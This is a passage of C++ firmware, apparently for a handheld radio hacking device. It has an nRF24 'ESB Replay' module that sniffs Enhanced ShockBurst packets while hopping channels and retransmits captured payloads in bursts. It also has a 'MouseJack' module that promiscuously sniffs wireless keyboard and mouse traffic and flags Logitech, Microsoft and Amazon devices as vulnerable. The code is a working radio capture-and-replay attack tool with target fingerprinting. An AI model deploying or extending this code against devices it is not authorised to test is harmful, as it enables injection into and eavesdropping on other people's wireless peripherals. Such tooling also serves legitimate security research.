              rpPayloadHex(data, len, 8), UI_OK);
}

static bool rpRxAvailable() {
  return (rpGetRegister(_RP_STATUS) & 0x40) != 0;
}

static void rpPollCapture() {
  if (!s_armed || s_playing) return;
  uint8_t guard = 0;
  while (rpRxAvailable() && guard < 6) {
    uint8_t payload[kRpPayloadMax];
    digitalWrite(CSN, LOW);
    SPI.transfer(0x61);
    for (int i = 0; i < kRpPayloadMax; i++) payload[i] = SPI.transfer(0xFF);
    digitalWrite(CSN, HIGH);
    rpSetRegister(_RP_STATUS, 0x70);

    const int len = rpTrimLen(payload, kRpPayloadMax);
    if (rpInteresting(payload, len)) {
      s_heardTotal++;
      rpStoreCapture(s_channel, payload, (uint8_t)len);
    }
    guard++;
  }
}

static void rpStepHop() {
  if (!s_armed || s_playing || !s_hopping) return;
  const uint32_t now = millis();
  if (now - s_lastHopMs < kRpHopIntervalMs) return;
  s_lastHopMs = now;
  s_hopIndex = (s_hopIndex + 1) % kRpHopCount;
  s_channel = kRpHopChannels[s_hopIndex];
  rpApplyChannel(s_channel);
  s_statusDirty = true;
}

static void rpWritePayload(const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xA0);
  for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
  digitalWrite(CSN, HIGH);
  rpSetRegister(_RP_STATUS, 0x70);
  rpEnable();
  delayMicroseconds(15);
  rpDisable();
  delayMicroseconds(150);
}

void runUI();

static void rpPlaySelected() {
  if (s_capCount <= 0 || s_selIndex < 0 || s_selIndex >= s_capCount) {
    rpAppendLog("[!] No capture selected", UI_WARN);
    rpFlushUi(true);
    return;
  }
  if (s_playing) return;

  const RpCapture cap = s_caps[s_selIndex];
  s_playing = true;
  s_statusDirty = true;
  rpFlushUi(true);
  rpAppendLog(String("[>] Play ch") + String(cap.channel) + " x" + String(kRpReplayBursts),
              UI_WARN);
  rpFlushUi(true);

  rpConfigureTx(cap.channel);
  for (uint8_t n = 0; n < kRpReplayBursts; n++) {
    if (feature_exit_requested || featureExitButtonPressed()) break;
    rpWritePayload(cap.data, cap.len);
    delay(kRpReplayGapMs);
    // Nearby channels help hopping receivers
    if (n == 1) {
      rpSetRegister(_RP_RF_CH, (uint8_t)((cap.channel + 1) % 84));
    } else if (n == 2) {
      rpSetRegister(_RP_RF_CH, cap.channel);
    }
    maintainTouchNavBar();
    runUI();
  }

  rpConfigureRx();
  s_playing = false;
  rpAppendLog("[+] Replay done", UI_OK);
  s_statusDirty = true;
  rpFlushUi(true);
}

static void rpToggleArm() {
  s_armed = !s_armed;
  if (s_armed) {
    rpConfigureRx();
    rpAppendLog("[+] Armed — capturing", UI_OK);
  } else {
    rpDisable();
    rpAppendLog("[*] Capture paused", UI_DIM_TEXT);
  }
  s_statusDirty = true;
  rpFlushUi(true);
}

static void rpClearCaptures() {
  for (int i = 0; i < kRpMaxCaptures; i++) s_caps[i].used = false;
  s_capCount = 0;
  s_selIndex = 0;
  s_selScroll = 0;
  s_selDirty = true;
  s_statusDirty = true;
  rpAppendLog("[*] Captures cleared", UI_DIM_TEXT);
  rpFlushUi(true);
}

static void rpPrev() {
  if (s_capCount <= 0) return;
  s_selIndex = (s_selIndex - 1 + s_capCount) % s_capCount;
  s_selDirty = true;
  s_statusDirty = true;
  rpFlushUi(true);
}

static void rpNext() {
  if (s_capCount <= 0) return;
  s_selIndex = (s_selIndex + 1) % s_capCount;
  s_selDirty = true;
  s_statusDirty = true;
  rpFlushUi(true);
}

static void rpSelectAt(int idx) {
  if (idx < 0 || idx >= s_capCount) return;
  if (idx == s_selIndex) return;
  s_selIndex = idx;
  s_selDirty = true;
  s_statusDirty = true;
  rpFlushUi(true);
}

static unsigned long s_rpLastBtnMs = 0;

static void rpWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isButtonPressed(pin) && millis() - t0 < 400) delay(5);
  delay(30);
}

void rpHandleNavButtons() {
  if (!featureHasTouchNavBar()) return;
  if (millis() - s_rpLastBtnMs < 80) return;

  if (isButtonPressedEdge(BTN_LEFT)) {
    rpPrev();
    s_rpLastBtnMs = millis();
    rpWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    rpNext();
    s_rpLastBtnMs = millis();
    rpWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    const uint32_t t0 = millis();
    while (isButtonPressed(BTN_DOWN) && millis() - t0 < 700) delay(10);
    if (millis() - t0 >= 700) {
      rpClearCaptures();
    } else {
      rpToggleArm();
    }
    s_rpLastBtnMs = millis();
    rpWaitNavRelease(BTN_DOWN);
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    rpPlaySelected();
    s_rpLastBtnMs = millis();
    rpWaitNavRelease(BTN_UP);
  }
}

void runUI() {
  static constexpr int kBarY = 20;
  static constexpr int kBarH = 20;
  static constexpr int kIconSz = 16;
  static constexpr int kIconN = 5;
  static int iconX[kIconN] = {90, 130, 170, 210, 10};
  static int iconY = kBarY;
  static const unsigned char* icons[kIconN] = {
    bitmap_icon_LEFT,
    bitmap_icon_random,
    bitmap_icon_start,
    bitmap_icon_RIGHT,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, kBarY, 240, kBarH, DARK_GRAY);
    for (int i = 0; i < kIconN; i++) {
      if (icons[i]) drawToolbarIcon(iconX[i], iconY, icons[i], UI_ICON);
    }
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, kBarY + kBarH, 240, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= TOOLBAR_ANIMATION_MS) {
    if (animationState == 1) {
      drawToolbarIcon(iconX[activeIcon], iconY, icons[activeIcon], UI_ICON);
      animationState = 2;
      switch (activeIcon) {
        case 0: rpPrev(); break;
        case 1: rpToggleArm(); break;
        case 2: rpPlaySelected(); break;
        case 3: rpNext(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < kIconN; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            if (icons[i] && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
                s_active = false;
              } else {
                drawToolbarIcon(iconX[i], iconY, icons[i], TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      } else if (s_capCount > 0 &&
                 y >= kRpSelStartY && y < rpSelEndY() &&
                 x >= 8 && x <= tft.width() - 8) {
        const int row = (y - kRpSelStartY) / kRpLineHeight;
        if (row >= 0 && row < kRpSelVisible) {
          rpSelectAt(s_selScroll + row);
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void esbReplaySetup() {
  setTouchButtonInputEnabled(true);
  neopixelClear();
  bleSetEsbReplayNavLabels();
  bleClearBody(TFT_BLACK);

  uiDrawn = false;
  s_active = true;
  s_armed = true;
  s_hopping = true;
  s_playing = false;
  s_channel = kRpHopChannels[0];
  s_hopIndex = 0;
  s_lastHopMs = millis();
  s_heardTotal = 0;
  s_capCount = 0;
  s_selIndex = 0;
  s_selScroll = 0;
  s_selLineCount = 0;
  s_logIndex = 0;
  s_logDirty = false;
  s_statusDirty = false;
  s_selDirty = false;
  s_lastUiMs = 0;

  for (int i = 0; i < kRpMaxCaptures; i++) s_caps[i].used = false;
  for (int i = 0; i < kRpMaxSelLines; i++) {
    s_selBuffer[i] = "";
    s_selColor[i] = UI_DIM_TEXT;
    s_selDrawn[i] = "";
    s_selDrawnColor[i] = 0;
    s_selDrawnW[i] = 0;
  }
  for (int i = 0; i < kRpMaxLogLines; i++) {
    s_logBuffer[i] = "";
    s_logColor[i] = UI_DIM_TEXT;
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < kRpStatusLines; i++) {
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();

  runUI();
  rpDrawTextBoxes();
  rpAppendLog("[+] ESB Replay ready", UI_WARN);
  rpAppendLog("[*] Tap Select or Prev/Next", UI_DIM_TEXT);
  s_selDirty = true;
  s_statusDirty = true;
  rpFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();
  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);
  rpInitSpi();
  rpConfigureRx();
  redrawTouchButtonBar();
}

void esbReplayLoop() {
  s_active = true;
  while (s_active) {
    if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      s_active = false;
      break;
    }
    rpHandleNavButtons();
    maintainTouchNavBar();
    runUI();
    rpStepHop();
    rpPollCapture();
    rpFlushUi(false);
    delay(1);
  }
}

void exit() {
  s_active = false;
  s_armed = false;
  s_playing = false;
  rpDisable();
  rpPowerDown();
  digitalWrite(CSN, HIGH);
  releaseSharedSpiWithoutSdMount();
}

}  // namespace EsbReplay

namespace MouseJack {

#define CE  configuredNrfAuxCePin()
#define CSN configuredNrfAuxCsnPin()

#define _MJ_CONFIG      0x00
#define _MJ_EN_AA       0x01
#define _MJ_EN_RXADDR   0x02
#define _MJ_SETUP_AW    0x03
#define _MJ_SETUP_RETR  0x04
#define _MJ_RF_CH       0x05
#define _MJ_RF_SETUP    0x06
#define _MJ_STATUS      0x07
#define _MJ_RX_ADDR_P0  0x0A
#define _MJ_RX_PW_P0    0x11

static constexpr int kMjPayloadMax = 32;
static constexpr int kMjMaxDevices = 12;
static constexpr int kMjMaxLogLines = 16;
static constexpr int kMjStatusLines = 4;
static constexpr int kMjLineHeight = 12;
static constexpr int kMjToolbarBottom = 36;
static constexpr int kMjToolbarGap = 8;
static constexpr int kMjStatusY = kMjToolbarBottom + kMjToolbarGap;
static constexpr int kMjBoxHeaderH = 15;
static constexpr int kMjStatusTextY = kMjStatusY + kMjBoxHeaderH;
static constexpr int kMjStatusBoxH = kMjBoxHeaderH + (kMjStatusLines * kMjLineHeight) + 4;
static constexpr int kMjLogGap = 4;
static constexpr int kMjLogBoxTop = kMjStatusY + kMjStatusBoxH + kMjLogGap;
static constexpr int kMjLogStartY = kMjLogBoxTop + kMjBoxHeaderH;
static constexpr int kMjLogBottomPad = 4;
static constexpr uint32_t kMjHopIntervalMs = 60;
static constexpr uint32_t kMjDeviceTimeoutMs = 45000;

// Channels commonly used by Logitech Unifying / Microsoft / related HID (MouseJack research).
static const uint8_t kMjChannels[] = {
  2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
  16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
  32, 33, 35, 37, 40, 42, 44, 46, 48, 50, 52, 55, 57, 60,
  62, 65, 67, 68, 70, 72, 74, 76, 78, 80, 82
};
static constexpr int kMjChannelCount = sizeof(kMjChannels) / sizeof(kMjChannels[0]);

static const uint8_t kMjPromiscAddr[5] = {0x55, 0x55, 0x55, 0x55, 0x55};

enum class MjVendor : uint8_t {
  Unknown = 0,
  Logitech,
  Microsoft,
  Amazon,
  Other
};

struct MjDevice {
  uint8_t addr[5];
  bool used = false;
  MjVendor vendor = MjVendor::Unknown;
  bool vulnerable = false;
  uint16_t hits = 0;
  uint8_t lastCh = 0;
  uint32_t lastSeenMs = 0;
};

static bool uiDrawn = false;
static volatile bool scanning = false;
static bool s_paused = false;
static uint8_t s_channel = 2;
static int s_hopIndex = 0;
static uint32_t s_lastHopMs = 0;
static uint32_t s_packetTotal = 0;
static uint16_t s_deviceCount = 0;
static uint16_t s_vulnCount = 0;

static MjDevice s_devices[kMjMaxDevices];

static String s_logBuffer[kMjMaxLogLines];
static uint16_t s_logColor[kMjMaxLogLines];
static int s_logIndex = 0;

static String s_statusText[kMjStatusLines];
static uint16_t s_statusColor[kMjStatusLines];
static int s_statusDrawnW[kMjStatusLines];

static String s_logDrawn[kMjMaxLogLines];
static uint16_t s_logDrawnColor[kMjMaxLogLines];
static int s_logDrawnW[kMjMaxLogLines];

static bool s_mjLogDirty = false;
static bool s_mjStatusDirty = false;
static bool s_mjListDirty = false;
static uint32_t s_mjLastUiMs = 0;
static constexpr uint32_t kMjUiMinIntervalMs = 120;

static int mjLogBoxBottom() {
  return bleContentBottom() - kMjLogBottomPad;
}

static int mjLogBoxH() {
  const int h = mjLogBoxBottom() - kMjLogBoxTop;
  return h > (kMjBoxHeaderH + kMjLineHeight) ? h : (kMjBoxHeaderH + kMjLineHeight);
}

static int mjLogEndY() {
  return kMjLogBoxTop + mjLogBoxH() - 2;
}

static int mjVisibleLogLines() {
  const int avail = mjLogEndY() - kMjLogStartY;
  if (avail <= 0) {
    return 1;
  }
  const int n = avail / kMjLineHeight;
  if (n < 1) {
    return 1;
  }
  return n > kMjMaxLogLines ? kMjMaxLogLines : n;
}

static byte mjGetRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

static void mjSetRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

static void mjWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer((reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) {
    SPI.transfer(data[i]);
  }
  digitalWrite(CSN, HIGH);
}

static void mjDisable() { digitalWrite(CE, LOW); }
static void mjEnable() { digitalWrite(CE, HIGH); }

static void mjPowerUp() {
  mjSetRegister(_MJ_CONFIG, mjGetRegister(_MJ_CONFIG) | 0x02);
  delayMicroseconds(130);
}

static void mjPowerDown() {
  mjSetRegister(_MJ_CONFIG, mjGetRegister(_MJ_CONFIG) & ~0x02);
}

static void mjFlushRx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE2);
  digitalWrite(CSN, HIGH);
}

static void mjInitRadioSpi() {
  prepareNrfSharedSpiBus();
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(kNrfSpiHz);
  SPI.setBitOrder(MSBFIRST);
}

static void mjApplyChannel(uint8_t ch) {
  mjDisable();
  mjSetRegister(_MJ_RF_CH, ch);
  mjFlushRx();
  mjEnable();
  delayMicroseconds(130);
}

static void mjConfigureRadio() {
  mjDisable();
  mjPowerUp();
  mjWriteRegMulti(_MJ_RX_ADDR_P0, kMjPromiscAddr, 5);
  mjSetRegister(_MJ_EN_AA, 0x00);
  mjSetRegister(_MJ_EN_RXADDR, 0x01);
  mjSetRegister(_MJ_SETUP_AW, 0x03);
  mjSetRegister(_MJ_SETUP_RETR, 0x00);
  mjSetRegister(_MJ_RF_SETUP, 0x0F);  // 2 Mbps, high gain
  mjSetRegister(_MJ_RX_PW_P0, kMjPayloadMax);
  mjSetRegister(_MJ_CONFIG, 0x03);    // PWR_UP | PRIM_RX, CRC off
  mjApplyChannel(s_channel);
}

static uint8_t mjLogitechChecksum(const uint8_t* p, int len) {
  uint8_t ck = 0xFF;
  for (int i = 0; i < len - 1; i++) {
    ck = (uint8_t)((ck - p[i]) & 0xFF);
  }
  return (uint8_t)((ck + 1) & 0xFF);
}

static bool mjLooksLikeLogitech(const uint8_t* p, int len) {
  if (len < 6 || len > 22) {
    return false;
  }
  return mjLogitechChecksum(p, len) == p[len - 1];
}

// Logitech Unifying unencrypted HID reports (MouseJack-vulnerable class).
static bool mjLogitechVulnerableReport(const uint8_t* p, int len) {
  if (!mjLooksLikeLogitech(p, len) || len < 8) {
    return false;
  }
  // Unencrypted keyboard / multimedia frames commonly seen in research dumps.
  const uint8_t t = p[1];
  if (t == 0x10 || t == 0x11 || t == 0x01 || t == 0xC1) {
    return true;
  }
  // Unencrypted mouse keepalives / motion without encryption markers.
  if (t == 0x00 && len <= 10) {
    return true;
  }
  return false;
}

static bool mjLooksLikeMicrosoft(const uint8_t* p, int len) {
  if (len < 8) {
    return false;
  }
  // Microsoft wireless HID often carries a stable header nibble pattern.
  if (p[0] == 0x0A || p[0] == 0x08 || p[0] == 0x0F) {
    return true;
  }
  return false;
}

static bool mjLooksLikeAmazon(const uint8_t* p, int len) {
  if (len < 6) {
    return false;
  }
  // Fire TV / Amazon remotes on nRF24 often use short frames with 0x0D/0x40 prefixes.
  return (p[0] == 0x0D || p[0] == 0x40 || p[0] == 0x4F);
}

static bool mjPayloadInteresting(const uint8_t* p, int len) {
  if (len < 5) {
    return false;
  }
  int zeros = 0;
  int ff = 0;
  for (int i = 0; i < len; i++) {
    if (p[i] == 0x00) zeros++;
    if (p[i] == 0xFF) ff++;
  }
  if (zeros >= len - 1 || ff >= len - 1) {
    return false;
  }
  return mjLooksLikeLogitech(p, len) || mjLooksLikeMicrosoft(p, len) || mjLooksLikeAmazon(p, len);
}

static int mjTrimLen(const uint8_t* p, int maxLen) {
  int len = maxLen;
  while (len > 1 && p[len - 1] == 0x00) {
    len--;
  }
  return len;
}

static String mjAddrToString(const uint8_t* a) {
  char buf[16];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X", a[0], a[1], a[2], a[3], a[4]);
  return String(buf);
}

static const char* mjVendorName(MjVendor v) {
  switch (v) {
    case MjVendor::Logitech: return "Logitech";
    case MjVendor::Microsoft: return "Microsoft";
    case MjVendor::Amazon: return "Amazon";
    case MjVendor::Other: return "nRF HID";
    default: return "Unknown";
  }
}

static void mjClassify(const uint8_t* p, int len, MjVendor& vendor, bool& vulnerable) {
  vendor = MjVendor::Unknown;
  vulnerable = false;
  if (mjLooksLikeLogitech(p, len)) {
    vendor = MjVendor::Logitech;
    vulnerable = mjLogitechVulnerableReport(p, len);
    return;
  }
  if (mjLooksLikeMicrosoft(p, len)) {
    vendor = MjVendor::Microsoft;
    // Many older Microsoft wireless HID stacks were in scope of MouseJack-class attacks.
    vulnerable = true;
    return;
  }
  if (mjLooksLikeAmazon(p, len)) {
    vendor = MjVendor::Amazon;
    vulnerable = true;
    return;
  }
  vendor = MjVendor::Other;
}

static void mjRebuildCounts() {
  s_deviceCount = 0;
  s_vulnCount = 0;
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (!s_devices[i].used) {
      continue;
    }
    s_deviceCount++;
    if (s_devices[i].vulnerable) {
      s_vulnCount++;
    }
  }
}

static void mjAppendLogLine(const String& text, uint16_t color) {
  const int visible = mjVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    s_logBuffer[i] = s_logBuffer[i - 1];
    s_logColor[i] = s_logColor[i - 1];
  }
  s_logBuffer[0] = text;
  s_logColor[0] = color;
  if (s_logIndex < visible) {
    s_logIndex++;
  }
  s_mjLogDirty = true;
}

static constexpr int kMjStatPadX = 10;
static constexpr int kMjStatValueX = 70;
static constexpr int kMjStatTextDy = 2;

static void mjPaintTextLine(int x, int y, int maxW, int lineH,
                            String& cacheText, uint16_t& cacheColor, int& cacheW,
                            const String& text, uint16_t color) {
  if (cacheText == text && cacheColor == color) {
    return;
  }
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  const int newW = text.length() ? (tft.textWidth(text) + 2) : 0;
  int clearW = cacheW > newW ? cacheW : newW;
  if (clearW < 8) {
    clearW = maxW;
  }
  if (clearW > maxW) {
    clearW = maxW;
  }
  tft.fillRect(x, y, clearW, lineH, TFT_BLACK);
  if (text.length()) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(x, y + kMjStatTextDy);
    tft.print(text);
  }
  cacheText = text;
  cacheColor = color;
  cacheW = newW > 0 ? newW : 0;
}

static void mjRedrawLog() {
  const int endY = mjLogEndY();
  const int visible = mjVisibleLogLines();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = kMjLogStartY + i * kMjLineHeight;
    if (y + kMjLineHeight > endY) {
      break;
    }
    if (i < s_logIndex) {
      mjPaintTextLine(kMjStatPadX, y, maxW, kMjLineHeight,
                      s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                      s_logBuffer[i], s_logColor[i]);
    } else {
      mjPaintTextLine(kMjStatPadX, y, maxW, kMjLineHeight,
                      s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                      String(""), UI_DIM_TEXT);
    }
  }
  s_mjLogDirty = false;
}

static void mjDrawStatusValue(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kMjStatusLines) {
    return;
  }
  const int y = kMjStatusTextY + line * kMjLineHeight;
  const int maxW = tft.width() - kMjStatValueX - 8;
  mjPaintTextLine(kMjStatValueX, y, maxW, kMjLineHeight,
                  s_statusText[line], s_statusColor[line], s_statusDrawnW[line],
                  text, color);
}

static void mjDrawTextBoxes() {
  const int logH = mjLogBoxH();
  const int endY = mjLogEndY();
  tft.fillRect(0, kMjStatusY - 2, tft.width(), endY - kMjStatusY + 4, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kMjStatusY, tft.width() - 8, kMjStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kMjLogBoxTop, tft.width() - 8, logH, 3, UI_LINE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(kMjStatPadX, kMjStatusY + 3);
  tft.print("Scan Status");
  tft.setCursor(kMjStatPadX, kMjLogBoxTop + 3);
  tft.print("Devices");

  static const char* kLabels[kMjStatusLines] = {"Ch", "Found", "Mode", "State"};
  for (int i = 0; i < kMjStatusLines; i++) {
    const int y = kMjStatusTextY + i * kMjLineHeight + kMjStatTextDy;
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(kMjStatPadX, y);
    tft.print(kLabels[i]);
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kMjMaxLogLines; i++) {
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
}

static void mjUpdateStatusPanel() {
  char chVal[28];
  snprintf(chVal, sizeof(chVal), "%u  %lu pkts", (unsigned)s_channel,
           (unsigned long)s_packetTotal);
  mjDrawStatusValue(0, String(chVal), UI_TEXT);

  char foundVal[28];
  snprintf(foundVal, sizeof(foundVal), "%u  Vuln %u", (unsigned)s_deviceCount,
           (unsigned)s_vulnCount);
  mjDrawStatusValue(1, String(foundVal),
                    s_vulnCount > 0 ? UI_WARN : (s_deviceCount > 0 ? UI_OK : UI_DIM_TEXT));

  mjDrawStatusValue(2, "Channel hop", UI_DIM_TEXT);

  if (s_paused) {
    mjDrawStatusValue(3, "Paused", UI_WARN);
  } else {
    mjDrawStatusValue(3, scanning ? "Scanning" : "Stopped",
                      scanning ? UI_OK : UI_DIM_TEXT);
  }
  s_mjStatusDirty = false;
}

static void mjRebuildDeviceLines() {
  const int visible = mjVisibleLogLines();
  s_logIndex = 0;
  for (int i = 0; i < kMjMaxLogLines; i++) {
    s_logBuffer[i] = "";
    s_logColor[i] = UI_DIM_TEXT;
  }

  auto pushDev = [&](const MjDevice& d) {
    if (s_logIndex >= visible) {
      return;
    }
    String line = mjAddrToString(d.addr);
    line += " ";
    line += mjVendorName(d.vendor);
    if (d.vulnerable) {
      line += " VULN";
    }
    line += " x";
    line += String(d.hits);
    s_logBuffer[s_logIndex] = line;
    s_logColor[s_logIndex] = d.vulnerable ? UI_WARN : UI_TEXT;
    s_logIndex++;
  };

  for (int i = 0; i < kMjMaxDevices; i++) {
    if (s_devices[i].used && s_devices[i].vulnerable) {
      pushDev(s_devices[i]);
    }
  }
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (s_devices[i].used && !s_devices[i].vulnerable) {
      pushDev(s_devices[i]);
    }
  }
  if (s_deviceCount == 0) {
    s_logBuffer[0] = "[*] Waiting for HID traffic...";
    s_logColor[0] = UI_DIM_TEXT;
    s_logIndex = 1;
  }
  s_mjLogDirty = true;
  s_mjListDirty = false;
}

static void mjFlushUi(bool force = false) {
  const uint32_t now = millis();
  if (!force && (now - s_mjLastUiMs) < kMjUiMinIntervalMs) {
    return;
  }
  if (!force && !s_mjLogDirty && !s_mjStatusDirty && !s_mjListDirty) {
    return;
  }
  s_mjLastUiMs = now;
  if (s_mjListDirty) {
    mjRebuildDeviceLines();
  }
  if (s_mjStatusDirty || force) {
    mjUpdateStatusPanel();
  }
  if (s_mjLogDirty || force) {
    mjRedrawLog();
  }
}

static int mjFindDevice(const uint8_t* addr) {
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (s_devices[i].used && memcmp(s_devices[i].addr, addr, 5) == 0) {
      return i;
    }
  }
  return -1;
}

static int mjAllocDevice() {
  int oldest = -1;
  uint32_t oldestMs = UINT32_MAX;
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (!s_devices[i].used) {
      return i;
    }
    if (s_devices[i].lastSeenMs < oldestMs) {
      oldestMs = s_devices[i].lastSeenMs;
      oldest = i;
    }
  }
  return oldest;
}

static void mjNoteDevice(const uint8_t* addr, uint8_t ch, MjVendor vendor, bool vulnerable) {
  int idx = mjFindDevice(addr);
  const bool isNew = (idx < 0);
  if (isNew) {
    idx = mjAllocDevice();
    if (idx < 0) {
      return;
    }
    memset(&s_devices[idx], 0, sizeof(MjDevice));
    memcpy(s_devices[idx].addr, addr, 5);
    s_devices[idx].used = true;
    s_devices[idx].hits = 0;
  }

  s_devices[idx].hits++;
  s_devices[idx].lastCh = ch;
  s_devices[idx].lastSeenMs = millis();
  if (vendor != MjVendor::Unknown) {
    s_devices[idx].vendor = vendor;
  }
  if (vulnerable) {
    s_devices[idx].vulnerable = true;
  }

  mjRebuildCounts();
  s_mjStatusDirty = true;
  if (isNew || vulnerable || (s_devices[idx].hits % 8) == 0) {
    s_mjListDirty = true;
  }
  mjSharedPublish(s_devices[idx].addr, s_devices[idx].lastCh, s_devices[idx].vulnerable,
                  mjVendorName(s_devices[idx].vendor));
}

// Build a stable pseudo-address from payload fingerprint for tracking.
static void mjDeriveAddr(const uint8_t* p, int len, uint8_t out[5]) {
  // Prefer bytes that look like address remnants after a 0x55 prefix match.
  if (len >= 5) {
    out[0] = p[0];
    out[1] = p[1];
    out[2] = p[2];
    out[3] = p[3];
    out[4] = p[4];
    // Avoid all-identical garbage addresses.
    if (!(out[0] == out[1] && out[1] == out[2] && out[2] == out[3] && out[3] == out[4])) {
      return;
    }
  }
  uint32_t h = 2166136261u;
  for (int i = 0; i < len; i++) {
    h ^= p[i];
    h *= 16777619u;
  }
  out[0] = (uint8_t)(h >> 24);
  out[1] = (uint8_t)(h >> 16);
  out[2] = (uint8_t)(h >> 8);
  out[3] = (uint8_t)(h);
  out[4] = (uint8_t)(len ^ p[0]);
}

static bool mjRxAvailable() {
  return (mjGetRegister(_MJ_STATUS) & 0x40) != 0;
}

static void mjReadPacket() {
  uint8_t payload[kMjPayloadMax];
  digitalWrite(CSN, LOW);
  SPI.transfer(0x61);
  for (int i = 0; i < kMjPayloadMax; i++) {
    payload[i] = SPI.transfer(0xFF);
  }
  digitalWrite(CSN, HIGH);
  mjSetRegister(_MJ_STATUS, 0x70);

  const int len = mjTrimLen(payload, kMjPayloadMax);
  if (!mjPayloadInteresting(payload, len)) {
    return;
  }

  s_packetTotal++;
  MjVendor vendor;
  bool vulnerable;
  mjClassify(payload, len, vendor, vulnerable);

  uint8_t addr[5];
  mjDeriveAddr(payload, len, addr);
  mjNoteDevice(addr, s_channel, vendor, vulnerable);
  s_mjStatusDirty = true;
}

static void mjPollPackets() {
  uint8_t guard = 0;
  while (scanning && !s_paused && mjRxAvailable() && guard < 8) {
    mjReadPacket();
    guard++;
  }
}

static void mjExpireDevices() {
  const uint32_t now = millis();
  bool changed = false;
  for (int i = 0; i < kMjMaxDevices; i++) {
    if (s_devices[i].used && (now - s_devices[i].lastSeenMs) > kMjDeviceTimeoutMs) {
      s_devices[i].used = false;
      changed = true;
    }
  }
  if (changed) {
    mjRebuildCounts();
    s_mjListDirty = true;
    s_mjStatusDirty = true;
  }
}

static void mjStepHop() {
  if (s_paused) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_lastHopMs < kMjHopIntervalMs) {
    return;
  }
  s_lastHopMs = now;
  s_hopIndex = (s_hopIndex + 1) % kMjChannelCount;
  s_channel = kMjChannels[s_hopIndex];
  mjApplyChannel(s_channel);
  s_mjStatusDirty = true;
}

static void mjClearDevices() {
  for (int i = 0; i < kMjMaxDevices; i++) {
    s_devices[i].used = false;
  }
  s_packetTotal = 0;
  s_deviceCount = 0;
  s_vulnCount = 0;
  s_mjListDirty = true;
  s_mjStatusDirty = true;
  mjFlushUi(true);
  mjAppendLogLine("[*] List cleared", UI_DIM_TEXT);
  mjFlushUi(true);
}

static void mjTogglePause() {
  s_paused = !s_paused;
  if (s_paused) {
    mjDisable();
    mjAppendLogLine("[*] Paused", UI_WARN);
  } else {
    mjEnable();
    mjAppendLogLine("[+] Scanning", UI_OK);
  }
  s_mjStatusDirty = true;
  mjFlushUi(true);
}

static unsigned long s_mjLastBtnMs = 0;
static constexpr unsigned long kMjNavDebounceMs = 80;

static void mjWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isButtonPressed(pin) && millis() - t0 < 400) {
    delay(5);
  }
  delay(30);
}

